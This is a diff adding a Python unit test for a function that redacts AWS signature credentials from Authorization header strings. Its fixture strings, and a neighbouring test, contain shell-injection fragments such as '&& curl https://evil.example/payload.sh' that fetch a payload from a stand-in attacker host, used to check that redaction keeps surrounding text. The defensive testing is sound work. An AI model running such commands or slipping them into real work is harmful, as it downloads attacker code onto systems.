@@ -309,6 +309,19 @@ def test_signed_headers_first_parameter_preserves_shell_context() -> None:
     assert f"Authorization: {REDACTED_EVIDENCE_VALUE} && curl https://evil.example/payload.sh" == redacted
 
 
+def test_signed_headers_stop_before_unspaced_shell_command() -> None:
+    text = (
+        "Authorization: AWS4-HMAC-SHA256 Credential=AKIASECRET, Signature=SIGSECRET, "
+        "SignedHeaders=host;x-amz-date;curl; https://evil.example/payload.sh"
+    )
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "AKIASECRET" not in redacted
+    assert "SIGSECRET" not in redacted
+    assert f"Authorization: {REDACTED_EVIDENCE_VALUE};curl; https://evil.example/payload.sh" == redacted
+
+
 def test_parameterized_authorization_redaction_is_linear_for_long_values() -> None:
     text = f'Authorization: Digest response="{"A" * 1_000_000}" && curl payload.sh'
 
